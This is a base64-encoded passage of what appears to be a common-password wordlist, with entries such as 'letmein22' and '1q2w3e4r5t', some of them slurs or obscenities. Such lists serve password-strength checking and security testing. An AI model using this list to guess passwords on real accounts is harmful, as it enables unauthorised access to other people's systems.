pcnZhbmExDQpuaXhvbg0Kbm9yYmVydA0KbmVzdGxlDQpicmVuZGExDQpib25hbnphDQpidW5keQ0KYnVkZGllcw0KaG90c3B1cg0KaGVhdnkNCmhvcnJvcg0KaHVmbXF3DQplbGVjdHJvDQplcmFzdXJlDQplbm91Z2gNCmVsaXNhYmV0DQpldHZ3dzQNCmV3eXV6YQ0KZXJpYzENCmtpbmRlcg0Ka2Vua2VuDQpraXNtZXQNCmtsYWF0dQ0KbXVzaWNpYW4NCm1pbGFtYmVyDQp3aWxsaQ0Kd2FpdGluZw0KaXNhY3MxNTUNCmlnb3INCjFtaWxsaW9uDQoxbGV0bWVpbg0KeDM1djhsDQp5b2dpDQp5d3Z4cHoNCnhuZ3dvag0KemlwcHkxDQowMjAyMDINCioqKioNCnN0b25ld2FsDQpzd2VlbmV5DQpzdG9yeQ0Kc2VudHJ5DQpzZXhzZXhzZXgNCnNwZW5jZQ0Kc29ueXNvbnkNCnNtaXJub2ZmDQpzdGFyMTINCnNvbGFjZQ0Kc2xlZGdlDQpzdGF0ZXMNCnNueWRlcg0Kc3RhcjENCnBheHRvbg0KcGVudGFnb24NCnBreGU2Mg0KcGlsb3QxDQpwb21tZXMNCnBhdWxwYXVsDQpwbGFudHMNCnRpY2FsDQp0aWN0YWMNCnRvZXMNCmxpZ2h0aG91DQpsZW1hbnMNCmt1YnJpY2sNCmxldG1laW4yMg0KbGV0bWVzZWUNCmp5czZ3eg0Kam9uZXN5DQpqampqamoxDQpqaWdnYQ0Kam9lbGxlDQptYXRlDQptZXJjaGFudA0KcmVkc3Rvcm0NCnJpbGV5MQ0Kcm9zYQ0KcmVsaWVmDQoxNDE0MTQxNA0KMTEyNg0KYWxsaXNvbjENCmJhZGJveTENCmFzdGhtYQ0KYXVnZ2llDQpiYXNlbWVudA0KaGFydGxleQ0KaGFydGZvcmQNCmhhcmR3b29kDQpndW1ibw0KNjE2OTEzDQo1N25wMzkNCjU2cWh4cw0KNG1udmVoDQpjYWtlDQpmb3JiZXMNCmZhdGx1dnI2OQ0KZnFrdzVtDQpmaWRlbGl0eQ0KZmVhdGhlcnMNCmZyZXNubw0KZ29kaXZhDQpnZWNrbw0KZ2xhZHlzDQpnaWJzb24xDQpnb2dhdG9ycw0KZnJpZGdlDQpnZW5lcmFsMQ0Kc2F4bWFuDQpyb3dpbmcNCnNhbW15cw0Kc2NvdHRzDQpzY291dDENCnNhc2FzYQ0Kc2Ftb2h0DQpkcmFnb242OQ0KZHVja3kNCmRyYWdvbmJhbGwNCmRyaWxsZXINCnAzd3Fhdw0KbnVyc2UNCnBhcGlsbG9uDQpvbmVvbmUNCm9wZW5pdA0Kb3B0aW1pc3QNCmxvbmdzaG90DQpwb3J0aWENCnJhcGllcg0KcHVzc3kyDQpyYWxwaGllDQp0dXhlZG8NCnVscmlrZQ0KdW5kZXJ0b3cNCnRyZW50b24NCmNvcGVuaGFnDQpjb21lDQpkZWxsZGVsbA0KY3VsaW5hcnkNCmRlbHRhcw0KbXl0aW1lDQpuaWNreQ0Kbmlja2llDQpub25hbWUNCm5vbGVzMQ0KYnVja2VyDQpib3BwZXINCmJ1bGxvY2sNCmJ1cm5vdXQNCmJyeWNlDQpoZWRnZXMNCmliaWxsdGVzDQpoaWhqZTg2Mw0KaGl0dGVyDQpla2ltDQplc3BhbmENCmVhdG1lNjkNCmVscGFzbw0KZW52ZWxvcGUNCmV4cHJlc3MxDQplZWVlZWUxDQplYXRtZTENCmthcmFva2UNCmthcmENCm11c3Rhbmc1DQptaXNzZXMNCndlbGxpbmd0DQp3aWxsZW0NCndhdGVyc2tpDQp3ZWJjYW0NCmphc29ucw0KaW5maW5pdGUNCmlsb3ZleW91IQ0KamFrYXJ0YQ0KYmVsYWlyDQpiaWdkYWQNCmJlZXJtZQ0KeW9zaGkNCnlpbnlhbmcNCnppbW1lcg0KeDI0aWszDQowNjNkeWp1eQ0KMDAwMDAwNw0KenRtZmNxDQpzdG9waXQNCnN0b29nZXMNCnN1cnZpdmFsDQpzdG9ja3Rvbg0Kc3ltb3c4DQpzdHJhdG8NCjJob3Q0dQ0Kc2hpcA0Kc2ltb25zDQpza2lucw0Kc2hha2VzDQpzZXgxDQpzaGllbGQNCnNuYWNrcw0Kc29mdHRhaWwNCnNsaW1lZDEyMw0KcGl6emFtYW4NCnBpcGUNCnBpdHQNCnBhdGhldGljDQpwaW50bw0KdGlnZXJjYXQNCnRvbnRvbg0KbGFnZXINCmxpenp5DQpqdWp1DQpqb2huMTIzDQpqZW5uaW5ncw0Kam9zaWFoDQpqZXNzZTENCmpvcmRvbg0KamluZ2xlcw0KbWFydGlhbg0KbWFyaW8xDQpyb290ZWRpdA0Kcm9jaGFyZA0KcmVkd2luZQ0KcmVxdWllbQ0Kcml2ZXJyYXQNCnJhdHMNCjExMTcNCjEwMTQNCjEyMDUNCmFsdGhlYQ0KYWxsaWUNCmFtb3INCmFtaWdhDQphbHBpbmENCmFsZXJ0DQphdHJlaWRlcw0KYmFuYW5hMQ0KYmFoYW11dA0KaGFydA0KZ29sZm1hbg0KaGFwcGluZXMNCjd1ZnR5eA0KNTQzMg0KNTM1Mw0KNTE1MQ0KNDc0Nw0KYnlyb24NCmNoYXRoYW0NCmNoYWR3aWNrDQpjaGVyaWUNCmZveGZpcmUNCmZmdmRqNDc0DQpmcmVha2VkDQpmb3Jlc2tpbg0KZ2F5Ym95DQpnZ2dnZ2cxDQpnbGVuZGENCmdhbWVvdmVyDQpnbGl0dGVyDQpmdW5ueTENCnNjb29ieWRvbw0Kc2Nyb2xsDQpydWRvbHBoDQpzYWRkbGUNCnNheG9waG9uDQpkaW5nYmF0DQpkaWdpbW9uDQpvbWljcm9uDQpwYXJzb25zDQpvaGlvDQpwYW5kYTENCmxvbG94eA0KbWFjaW50b3MNCmx1bHVsdQ0KbG9sbHlwb3ANCnJhY2VyMQ0KcXVlZW4xDQpxd2VydHp1aQ0KcHJpY2sNCnVwbmZtYw0KdHlyYW50DQp0cm91dDENCjlza3c1Zw0KYWNlbWFuDQphZGVsYWlkZQ0KYWNsczJoDQphYWFiYmINCmFjYXB1bGNvDQphZ2dpZQ0KY29tY2FzdA0KY3JhZnQNCmNyaXNzeQ0KY2xvdWR5DQpjcTJrcGgNCmN1c3Rlcg0KZDZvOHBtDQpjeWJlcnNleA0KZGF2ZWNvbGUNCmRhcmlhbg0KY3J1bWJzDQpkYWlzZXkNCmRhdmVkYXZlDQpkYXNhbmkNCm5lZWRsZQ0KbXplcGFiDQpteXBvcm4NCm5hcm5pYQ0KbmluZXRlZW4NCmJvb2dlcjENCmJyYXZvMQ0KYnVkZ2llDQpidG5qZXkNCmhpZ2hsYW5kZXINCmhvdGVsNg0KaHVtYnVnDQplZHdpbg0KZXd0b3NpDQprcmlzdGluMQ0Ka29iZQ0Ka251Y2tsZXMNCmtlaXRoMQ0Ka2F0YXJpbmENCm11ZmYNCm11c2NoaQ0KbW9udGFuYTENCndpbmdjaHVuDQp3aWdnbGUNCndoYXR0aGUNCndhbGtpbmcNCndhdGNoaW5nDQp2ZXR0ZTENCnZvbHMNCnZpcmFnbw0KaW50ajNhDQppc2htYWVsDQppbnRlcm4NCmphY2hpbg0KaWxsbWF0aWMNCjE5OTk5OQ0KMjAxMA0KYmVjaw0KYmxlbmRlcg0KYmlncGVuaXMNCmJlbmdhbA0KYmx1ZTEyMzQNCnlvdXINCnphcXhzdw0KeHJheQ0KeHh4eHh4eDENCnplYnJhcw0KeWFua3MNCndvcmxkcw0KdGFkcG9sZQ0Kc3RyaXBlcw0Kc3ZldGxhbmENCjM3MzcNCjQzNDMNCjM3MjgNCjQ0NDQ0NDQNCjM2OGVqaGloDQpzb2xhcg0Kc29ubmUNCnNtYWxscw0Kc25pZmZlcg0Kc29uYXRhDQpzcXVpcnRzDQpwaXRjaGVyDQpwbGF5c3RhdGlvbg0KcGt0bXhyDQpwZXNjYXRvcg0KcG9pbnRzDQp0ZXhhY28NCmxlc2Jvcw0KbGlsaWFuDQpsOHY1M3gNCmpvOWsyancyDQpqaW1iZWFtDQpqb3NpZQ0KamltaQ0KanVwaXRlcjINCmp1cmFzc2ljDQptYXJpbmVzMQ0KbWF5YQ0Kcm9ja2V0MQ0KcmluZ2VyDQoxNDcyNTgzNg0KMTIzNDU2NzkNCjEyMTkNCjEyMzA5OA0KMTIzMw0KYWxlc3NhbmQNCmFsdGhvcg0KYW5nZWxpa2ENCmFyY2gNCmFybWFuZG8NCmFscGhhMTIzDQpiYXNoZXINCmJhcmVmZWV0DQpiYWxib2ENCmJiYmJiMQ0KYmFua3MNCmJhZGFiaW5nDQpoYXJyaWV0DQpnb3BhY2sNCmdvbGZudXQNCmdzeHIxMDAwDQpncmVnb3J5MQ0KNzY2cmdscXkNCjg1MjANCjc1MzE1OQ0KOGRpaGM2DQo2OWNhbWFybw0KNjY2Nzc3DQpjaGVlYmENCmNoaW5vDQpjYWxlbmRhcg0KY2hlZWt5DQpjYW1lbDENCmZpc2hjYWtlDQpmYWxsaW5nDQpmbHViYmVyDQpnaXVzZXBwZQ0KZ2lhbm5pDQpnbG92ZXMNCmduYXNoZXIyMw0KZnJpc2JlZQ0KZnV6enkxDQpmdXp6YmFsbA0Kc2F1Y2UNCnNhdmUxM3R4DQpzY2hhdHoNCnJ1c3NlbGwxDQpzYW5kcmExDQpzY3JvdHVtDQpzY3VtYmFnDQpzYWJyZQ0Kc2FtZG9nDQpkcmlwcGluZw0KZHJhZ29uMTINCmRyYWdzdGVyDQpwYWlnZQ0Kb3J3ZWxsDQptYWlubGFuZA0KbHVuYXRpYw0KbG9ubmllDQpsb3Rpb24NCm1haW5lDQptYWRkdXgNCnFuNjMybw0KcG9vcGhlYWQNCnJhcHBlcg0KcG9ybjRsaWZlDQpwcm9kdWNlcg0KcmFwdW56ZWwNCnRyYWNrcw0KdmVsb2NpdHkNCnZhbmVzc2ExDQp1bHJpY2gNCnRydWVibHVlDQp2YW1waXJlMQ0KYWJhY3VzDQo5MDIxMDANCmNyaXNweQ0KY29ya3kNCmNyYW5lDQpjaG9vY2gNCmQ2d25ybw0KY3V0aWUNCmRlYWwNCmRhYnVsbHMNCmRlaHB5ZQ0KbmF2eXNlYWwNCm5qcWN3NA0Kbm93bm93DQpuaWdnZXIxDQpuaWdodG93bA0Kbm9uZW5vbmUNCm5pZ2h0bWFyDQpidXN0bGUNCmJ1ZGR5Mg0KYm9pbmdvDQpidWdtYW4NCmJ1bGxldGluDQpib3NzaG9nDQpib3dpZQ0KaHlicmlkDQpoaWxsc2lkZQ0KaGlsbHRvcA0KaG90bGVncw0KaG9uZXN0eQ0KaHp6ZTkyOWINCmhoaGhoMQ0KaGVsbG9oZWwNCmVsb2lzZQ0KZXZpbG9uZQ0KZWRnZXdpc2UNCmU1cGZ0dQ0KZWRlZA0KZW1iYWxtZXINCmV4Y2FsaWJ1cg0KZWxlZmFudA0Ka2VuemllDQprYXJsDQprYXJpbg0Ka2lsbGFoDQprbGVlbmV4DQptb3VzZXMNCm1vdW50YTFuDQptb3RvcnMNCm11dGxleQ0KbXVmZmRpdmUNCnZpdml0cm9uDQp3aW5maWVsZA0Kd2VkbmVzZGF5DQp3MDB0ODgNCmlsb3ZlaXQNCmphcmphcg0KaW5jZXN0DQppbmR5Y2FyDQoxNzE3MTcxNw0KMTY2NA0KMTcwMTE3MDENCjIyMjc3Nw0KMjY2Mw0KYmVlbGNoDQpiZW5iZW4NCnlpdGJvcw0KeXl5eXkxDQp5YXNtaW4NCnphcGF0YQ0Kenp6enoxDQpzdG9vZ2UNCnRhbmdlcmluDQp0YXp0YXoNCnN0ZXdhcnQxDQpzdW1tZXI2OQ0Kc3dlZXRuZXNzDQpzeXN0ZW0xDQpzdXJ2ZXlvcg0Kc3RpcmxpbmcNCjNxdnFvZA0KM3dheQ0KNDU2MzIxDQpzaXp6bGUNCnNpbWhycQ0Kc2hyaW5rDQpzaGF3bmVlDQpzb21lZGF5DQpzcGFydHkNCnNzcHR4NDUyDQpzcGhlcmUNCnNwYXJrDQpzbGFtbWVkDQpzb2Jlcg0KcGVyc2lhbg0KcGVwcGVycw0KcGxvcHB5DQpwbjVqdncNCnBvb2JlYXINCnBpYW5vcw0KcGxhc3Rlcg0KdGVzdG1lDQp0aWZmDQp0aHJpbGxlcg0KbGFyaXNzYQ0KbGVubm94DQpqZXdlbGwNCm1hc3RlcjEyDQptZXNzaWVyDQpyb2NrZXkNCjEyMjkNCjEyMTcNCjE0NzgNCjEwMDkNCmFuYXN0YXNpDQphbG1pZ2h0eQ0KYW1vbnJhDQphcmFnb24NCmFyZ2VudGluDQphbGJpbm8NCmF6YXplbA0KZ3JpbmRlcg0KNnVsZHY4DQo4M3k2cHYNCjg4ODg4ODgNCjR0bHZlZA0KNTE1MDUxDQpjYXJzdGVuDQpjaGFuZ2VzDQpmbGFuZGVycw0KZmx5ZXJzODgNCmZmZmZmZjENCmZpcmVoYXdrDQpmb3JlbWFuDQpmaXJlZG9nDQpmbGFzaG1hbg0KZ2dnZ2cxDQpnZXJiZXINCmdvZHNwZWVkDQpnYWx3YXkNCmdpdmVpdHVwDQpmdW50aW1lcw0KZ29oYW4NCmdpdmVtZQ0KZ2VyeWZlDQpmcmVuY2hpZQ0Kc2F5YW5nDQpydWRlYm95DQpzYXZhbm5hDQpzYW5kYWxzDQpkZXZpbmUNCmRvdWdhbA0KZHJhZzBuDQpkZ2E5bGENCmRpc2FzdGVyDQpkZXNrdG9wDQpvbmx5DQpvbmx5b25lDQpvdHRlcg0KcGFuZGFzDQptYWZpYQ0KbG9tYmFyZA0KbHVja3lzDQpsb3Zlam95DQpsb3ZlbGlmZQ0KbWFuZGVycw0KcHJvZHVjdA0KcXFoOTJyDQpxY21mZDQ1NA0KcG9yaw0KcmFkYXIxDQpwdW5hbmkNCnB0YmRodw0KdHVydGxlcw0KdW5kZXJ0YWtlcg0KdHJzOGY3DQp0cmFtcA0KdWdlanZwDQphYmJhDQo5MTF0dXJibw0KYWNkYw0KYWJjZDEyMw0KY2xldmVyDQpjb3JpbmENCmNyaXN0aWFuDQpjcmVhdGUNCmNyYXNoMQ0KY29sb255DQpjcm9zYnkNCmRlbGJveQ0KZGFuaWVsZQ0KZGF2aW5jaQ0KZGF1Z2h0ZXINCm5vdGVib29rDQpuaWtpDQpuaXRyb3gNCmJvcmFib3JhDQpib256YWkNCmJ1ZGQNCmJyaXNiYW5lDQpob3R0ZXINCmhlZWxlZA0KaGVyb2VzDQpob295YWgNCmhvdGdpcmwNCmk2MmdicQ0KaG9yc2UxDQpoaWxscw0KaHBrMnFjDQplcHZqYjYNCmVjaG8NCmtvcmVhbg0Ka3Jpc3RpZQ0KbW5idmMNCm1vaGFtbWFkDQptaW5kDQptb21teTENCm11bnN0ZXINCndhZGUNCndpY2Nhbg0Kd2FudGVkDQpqYWNrZXQNCjIzNjkNCmJldHR5Ym9vDQpibG9uZHkNCmJpc21hcmsNCmJlYW5iYWcNCmJqaGdmaQ0KYmxhY2tpY2UNCnl2dHRlNTQ1DQp5bm90DQp5ZXNzDQp6bHpmcmgNCndvbHZpZQ0KMDA3Ym9uZA0KKioqKioqDQp0YWlsZ2F0ZQ0KdGFueWExDQpzeGhxNjUNCnN0aW5reTENCjMyMzQ0MTINCjNraTQyeA0Kc2V2aWxsZQ0Kc2hpbW1lcg0Kc2hlcnlsDQpzaWVubmENCnNoaXRzaGl0DQpza2lsbGV0DQpzZWFtYW4NCnNvb25lcnMxDQpzb2xhcmlzDQpzbWFydGFzcw0KcGFzdG9yDQpwYXN0YQ0KcGVkcm9zDQpwZW5ueXdpcw0KcGZsb3lkDQp0b2J5ZG9nDQp0aGV0cnV0aA0KbGV0aGFsDQpsZXRtZTFuDQpsZWxhbmQNCmplbmlmZXINCm1hcmlvNjYNCm1pY2t5DQpyb2NreTINCnJld3ENCnJpcHBlZA0KcmVpbmRlZXINCjExMjgNCjEyMDcNCjExMDQNCjE0MzINCmFwcmlsaWENCmFsbHN0YXRlDQphbHlzb24NCmJhZ2Vscw0KYmFzaWMNCmJhZ2dpZXMNCmJhcmINCmJhcnJhZ2UNCmdyZWF0ZXN0DQpnb21leg0KZ3VydQ0KZ3VhcmQNCjcyZDV0bg0KNjA2MDYwDQo0d2Nxam4NCmNhbGR3ZWxsDQpjaGFuY2UxDQpjYXRhbG9nDQpmYXVzdA0KZmlsbQ0KZmxhbmdlDQpmcmFuDQpmYXJ0bWFuDQpnZWlsDQpnYmhjZjINCmZ1c3NiYWxsDQpnbGVuDQpmdWFxejQNCmdhbWVib3kNCmdhcm5ldA0KZ2VuZXZpZXYNCnJvdGFyeQ0Kc2VhaGF3aw0KcnVzc2VsDQpzYWFiDQpzZWFsDQpzYW1hZGFtcw0KZGV2bHQ0DQpkaXR0bw0KZHJldmlsDQpkcmlua2VyDQpkZXVjZQ0KZGlwc3RpY2sNCmRvbnV0DQpvY3RvcHVzDQpvdHRhd2ENCmxvc2FuZ2VsDQpsb3Zlcm1hbg0KcG9ya3kNCnE5dW1veg0KcmFwdHVyZQ0KcHVtcA0KcHVzc3k0bWUNCnVuaXZlcnNpdHkNCnRyaXBsZXgNCnVlOGZwdw0KdHJlbnQNCnRyb3BoeQ0KdHVyYm9zDQp0cm91Ymxlcw0KYWdlbnQNCmFhYTM0MA0KY2h1cmNoaWwNCmNyYXp5bWFuDQpjb25zdWx0DQpjcmVlcHkNCmNyYXZlbg0KY2xhc3MNCmN1dGllcGllDQpkZGRkZDENCmRlamF2dQ0KY3V4bGR2DQpuZXR0aWUNCm5idmlidA0Kbmlrb24NCm5pa28NCm5vcndvb2QNCm5hc2NhcjENCm5vbGFuDQpidWJiYTINCmJvb2JlYXINCmJvb2dlcnMNCmJ1ZmYNCmJ1bGx3aW5rDQpidWxseQ0KYnVsbGRhd2cNCmhvcnNlbWVuDQplc2NhbGFkZQ0KZWRpdG9yDQplYWdsZTINCmR5bmFtaWMNCmVsbGENCmVmeXJlZw0KZWRpdGlvbg0Ka2lkbmV5DQptaW5uZXNvdA0KbW9nd2FpDQptb3Jyb3cNCm1zbnhiaQ0KbW9vbmxpZ2h0DQptd3E2cWx6bw0Kd2Fycw0Kd2VyZGVyDQp2ZXJ5Z29vZA0Kdm9vZG9vMQ0Kd2hlZWwNCmlpaWlpaTENCjE1OTk1MQ0KMTYyNA0KMTkxMWExDQoyMjQ0DQpiZWxsYWdpbw0KYmVkbGFtDQpiZWxraW4NCmJpbGwxDQp3b29kcm93DQp4aXJ0MmsNCndvcnNoaXANCj8/Pz8/Pw0KdGFuYWthDQpzd2lmdA0Kc3VzaWVxDQpzdW5kb3duDQpzdWtlYmUNCnRhbGVzDQpzd2lmdHkNCjJmYXN0NHUNCnNlbmF0ZQ0Kc2V4ZQ0Kc2lja25lc3MNCnNocm9vbQ0Kc2hhdW4NCnNlYXdlZWQNCnNrZWV0ZXIxDQpzdGF0dXMNCnNuaWNrZXINCnNvcnJvdw0Kc3Bhbmt5MQ0Kc3Bvb2sNCnBhdHRpDQpwaGFlZHJ1cw0KcGlsb3RzDQpwaW5jaA0KcGVkZGxlcg0KdGhlbw0KdGh1bXBlcjENCnRlc3NpZQ0KdGlnZXI3DQp0bWp4bjE1MQ0KdGhlbWF0cmkNCmwyZzdrMw0KbGV0bWVpbm4NCmxhenkNCmplZmZqZWZmDQpqb2FuDQpqb2hubWlzaA0KbWFudHJhDQptYXJpYW5hDQptaWtlNjkNCm1hcnNoYWwNCm1hcnQNCm1hemRhNg0KcmlwdGlkZQ0Kcm9ib3RzDQpyZW50YWwNCjExMDcNCjExMzANCjE0Mjg1Nw0KMTEwMDEwMDENCjExMzQNCmFybW9yZWQNCmFsdmluDQphbGVjDQphbGxuaWdodA0KYWxyaWdodA0KYW1hdHVlcnMNCmJhcnRvaw0KYXR0b3JuZXkNCmFzdHJhbA0KYmFib29uDQpiYWhhbWFzDQpiYWxsczENCmJhc3Nvb24NCmhjbGVlYg0KaGFwcHltYW4NCmdyYW5pdGUNCmdyYXl3b2xmDQpnb2xmMQ0KZ29tZXRzDQo4dmp6dXMNCjc4OTANCjc4OTEyMw0KOHVpYXpwDQo1NzU3DQo0NzRqZHZmZg0KNTUxc2Nhc2kNCjUwY2VudA0KY2FtYXJvMQ0KY2hlcnJ5MQ0KY2hlbWlzdA0KZmluYWwNCmZpcmVuemUNCmZpc2h0YW5rDQpmYXJyZWxsDQpmcmVld2lsbA0KZ2xlbmRhbGUNCmZyb2dmcm9nDQpnZXJoYXJkdA0KZ2FuZXNoDQpzYW1lDQpzY2lyb2Njbw0KZGV2aWxtYW4NCmRvb2RsZXMNCmRpbmdlcg0Kb2tpbmF3YQ0Kb2x5bXBpYw0KbnVyc2luZw0Kb3JwaGV1cw0Kb2hteWdvZA0KcGFpc2xleQ0KcGFsbG1hbGwNCm51bGwNCmxvdW5nZQ0KbHVuY2hib3gNCm1hbmhhdHRhDQptYWhhbG8NCm1hbmRhcmluDQpxd3F3cXcNCnFndXZ5dA0KcHh4M2VmdHANCnByZXNpZGVudA0KcmFtYmxlcg0KcHV6emxlDQpwb3BweTENCnR1cmsxODINCnRyb3R0ZXINCnZkbHh1Yw0KdHJpc2gNCnR1Z2JvYXQNCnZhbGlhbnQNCnRyYWNpZQ0KdXdybDdjDQpjaHJpczEyMw0KY29hc3Rlcg0KY21mbnB1DQpkZWNpbWFsDQpkZWJiaWUxDQpkYW5keQ0KZGFlZGFsdXMNCmRlZGUNCm5hdGFzaGExDQpuaXNzYW4xDQpuYW5jeTEyMw0KbmV2ZXJtaW4NCm5hcGFsbQ0KbmV3Y2FzdGxlDQpib2F0cw0KYnJhbmRlbg0KYnJpdHQNCmJvbmdoaXQNCmhlc3Rlcg0KaWJ4bnNtDQpoaGhoaGgxDQpob2xnZXINCmR1cmhhbQ0KZWRtb250b24NCmVyd2luDQplcXVpbm94DQpkdmFkZXINCmtpbW15DQprbnVsbGENCm11c3RhZmENCm1vbnNvb24NCm1pc3RyYWwNCm1vcmdhbmENCm1vbmljYTENCm1vamF2ZQ0KbW9udGgNCm1vbnRlcmV5DQptcmJpbGwNCnZrYXhjcw0KdmljdG9yMQ0Kd2Fja2VyDQp3ZW5kZWxsDQp2aW9sYXRvcg0KdmZkaGlmDQp3aWxzb24xDQp3YXZwenQNCnZlcmVuYQ0Kd2lsZHN0YXINCndpbnRlcjk5DQppcXp6dDU4MA0KamFycm9kDQppbWJhY2sNCjE5MTQNCjE5NzQxOTc0DQoxbW9ua2V5DQoxcTJ3M2U0cjV0DQoyNTAwDQoyMjU1DQpibGFuaw0KYmlnc2hvdw0KYmlnYnVja3MNCmJsYWNrY29jDQp6b29tZXINCnd0Y2FjcQ0Kd29iYmxlDQp4bWVuDQp4anpucTUNCnllc3RlcmRhDQp5aHducWMNCnp6enh4eA0Kc3RyZWFrDQozOTM5MzkNCjJmY2hiZw0Kc2tpbmhlYWQNCnNraWxsZWQNCnNoYWtpcmENCnNoYWZ0DQpzaGFkb3cxMg0Kc2Vhc2lkZQ0Kc2lncmlkDQpzaW5mdWwNCnNpbGljb24NCnNtazczNjYNCnNuYXBzaG90DQpzbmlwZXIxDQpzb2NjZXIxMQ0Kc3RhZmYNCnNsYXANCnNtdXR0eQ0KcGVlcGVycw0KcGxlYXNhbnQNCnBsb2tpag0KcGRpZGR5DQpwaW1wZGFkZHkNCnRocnVzdA0KdGVycmFuDQp0b3Bheg0KdG9kYXkxDQpsaW9uaGVhcg0KbGl0dGxlbWENCmxhdXJlbjENCmxpbmNvbG4xDQpsZ251OWQNCmxhdWdoaW5nDQpqdW5lYXUNCm1ldGhvcw0KbWVkaW5hDQptZXJseW4NCnJvZ3VlMQ0Kcm9tdWx1cw0KcmVkc2hpZnQNCjEyMDINCjE0NjkNCjEybG9ja2VkDQphcml6b25hMQ0KYWxmYXJvbWUNCmFsOWFnZA0KYW9sMTIzDQphbHRlYw0KYXBvbGxvMQ0KYXJzZQ0KYmFrZXIxDQpiYmI3NDcNCmJhY2gNCmF4ZW1hbg0KYXN0cm8xDQpoYXd0aG9ybg0KZ29vZGZlbGwNCmhhd2tzMQ0KZ3N0cmluZw0KaGFubmVzDQo4NTQzODUyDQo4Njg2ODYNCjRuZzYydA0KNTU0dXpwYWQNCjU0MDENCjU2Nzg5MA0KNTIzMg0KY2F0Zm9vZA0KZnJhbWUNCmZsb3cNCmZpcmUxDQpmbGlwZmxvcA0KZmZmZmYxDQpmb3p6aWUNCmZsdWZmDQpnYXJyaXNvbg0KZnphcHBhDQpmdXJpb3VzDQpyb3VuZA0KcnVzdHlkb2cNCnNhbmRiZXJnDQpzY2FyYWINCnNhdGluDQpydWdlcg0Kc2Ftc3VuZzENCmRlc3Rpbg0KZGlhYmxvMg0KZHJlYW1lcjENCmRldGVjdGl2DQpkb21pbmljaw0KZG9xdnEzDQpkcnl3YWxsDQpwYWxhZGluMQ0KcGFwYWJlYXINCm9mZnJvYWQNCnBhbmFzb25pYw0Kbnl5YW5rZWUNCmx1ZXRkaQ0KcWNmbXR6DQpweWY4YWgNCnB1ZGRsZXMNCnByaXZhY3kNCnJhaW5lcg0KcHVzc3llYXQNCnJhbHBoMQ0KcHJpbmNldG8NCnRyaXZpYQ0KdHJld3ENCnRyaTVhMw0KYWR2ZW50DQo5ODk4DQphZ3l2b3JjDQpjbGFya2llDQpjb2FjaDENCmNvdXJpZXINCmNvbnRlc3QNCmNocmlzdG8NCmNvcmlubmENCmNob3dkZXINCmNvbmNlcHQNCmNsaW1iaW5nDQpjeXpraHcNCmRhdmlkYg0KZGFkMm93bnUNCmRheXMNCmRhcmVkZXZpDQpkZTdtZGYNCm5vc2UNCm5lY2tsYWNlDQpuYXpndWwNCmJvb2JvbzENCmJyb2FkDQpib256bw0KYnJlbm5hDQpib290DQpidXRjaDENCmh1c2tlcnMxDQpoZ2Zkc2ENCmhvcm55bWFuDQplbG1lcg0KZWxla3RyYQ0KZW5nbGFuZDENCmVsb2RpZQ0Ka2VybWl0MQ0Ka25pZmUNCmthYm9vbQ0KbWludXRlDQptb2Rlcm4NCm1vdGhlcmZ1Y2tlcg0KbW9ydGVuDQptb2NoYQ0KbW9uZGF5MQ0KbW9yZ290aA0Kd2FyZA0Kd2Vld2VlDQp3ZWVuaWUNCndhbHRlcnMNCnZvcmxvbg0Kd2Vic2l0ZQ0Kd2Fob28NCmlsb3ZlZ29kDQppbnNpZGVyDQpqYXltYW4NCjE5MTENCjFkYWxsYXMNCjE5MDANCjFyYW5nZXINCjIwMWplZGx6DQoyNTAxDQoxcWF6DQpiZXJ0cmFtDQpiaWdudXRzDQpiaWdiYWQNCmJlZWJlZQ0KYmlsbG93cw0KYmVsaXplDQpiZWJlDQp3dmo1bnANCnd1NGV0ZA0KeWFtYWhhMQ0Kd3JpbmtsZTUNCnplYnJhMQ0KeWFua2VlMQ0Kem9vbXpvb20NCjA5ODc2NTQzDQowMzExDQo/Pz8/Pw0Kc3RqYWJuDQp0YWludGVkDQozdG1uZWoNCnNob290DQpza29vdGVyDQpza2VsdGVyDQpzaXh0ZWVuDQpzdGFybGl0ZQ0Kc21hY2sNCnNwaWNlMQ0Kc3RhY2V5MQ0Kc21pdGh5DQpwZXJyaW4NCnBvbGx1eA0KcGV0ZXJub3J0aA0KcGl4aWUNCnBhdWxpbmENCnBpc3Rvbg0KcGljaw0KcG9ldHMNCnBpbmUNCnRvb25zDQp0b290aA0KdG9wc3Bpbg0Ka3VnbTdiDQpsZWdlbmRzDQpqZWVwamVlcA0KanVsaWFuYQ0Kam95c3RpY2sNCmp1bmttYWlsDQpqb2pvam9qbw0Kam9uYm95DQpqdWRnZQ0KbWlkbGFuZA0KbWV0ZW9yDQptY2NhYmUNCm1hdHRlcg0KbWF5ZmFpcg0KbWVldGluZw0KbWVycmlsbA0KcmF1bA0KcmljaGVzDQpyZXpub3INCnJvY2tyb2NrDQpyZWJvb3QNCnJlamVjdA0Kcm9ieW4NCnJlbmVlMQ0Kcm9hZHdheQ0KcmFzdGEyMjANCjE0MTENCjE0Nzg5NjMNCjEwMTkNCmFyY2hlcnkNCmFsbG1hbg0KYW5keWFuZHkNCmJhcmtzDQpiYWdwdXNzDQphdWNrbGFuZA0KZ29vc2VtYW4NCmhhem1hdA0KZ3VjY2kNCmd1bnMNCmdyYW1teQ0KaGFwcHlkb2cNCmdyZWVrDQo3a2JlOWQNCjc2NzYNCjZianZwZQ0KNWx5ZWRuDQo1ODU4DQo1MjkxDQpjaGFybGllMg0KY2hhcw0KYzdscnd1DQpjYW5keXMNCmNoYXRlYXUNCmNjY2NjMQ0KY2FyZGluYWxzDQpmZWFyDQpmaWhkZnYNCmZvcnR1bmUxMg0KZ29jYXRzDQpnYWVsaWMNCmZ3c2Fkbg0KZ29kYm95DQpnbGRtZW8NCmZ4M3R1bw0KZnViYXIxDQpnYXJsYW5kDQpnZW5lcmFscw0KZ2ZvcmNlDQpyeG10a3ANCnJ1bHoNCnNhaXJhbQ0KZHVuaGlsbA0KZGl2aXNpb24NCmRvZ2dnZw0KZGV0ZWN0DQpkZXRhaWxzDQpkb2xsDQpkcmlua3MNCm96bHE2cXdtDQpvdjNhankNCmxvY2tvdXQNCm1ha2F5bGENCm1hY2d5dmVyDQptYWxsb3JjYQ0KbG92ZXMNCnByaW1hDQpwdmplZ3UNCnFoeGJpag0KcmFwaGFlbA0KcHJlbHVkZTENCnRvdG9ybw0KdHVzeW1vDQp0cm91c2Vycw0KdHVubmVsDQp2YWxlcmlhDQp0dWxhbmUNCnR1cnRsZTENCnRyYWN5MQ0KYWVyb3NtaXQNCmFiYmV5MQ0KYWRkcmVzcw0KY2x0aWNpYw0KY2x1ZWxlc3MNCmNvb3BlcjENCmNvbWV0cw0KY29sbGVjdA0KY29y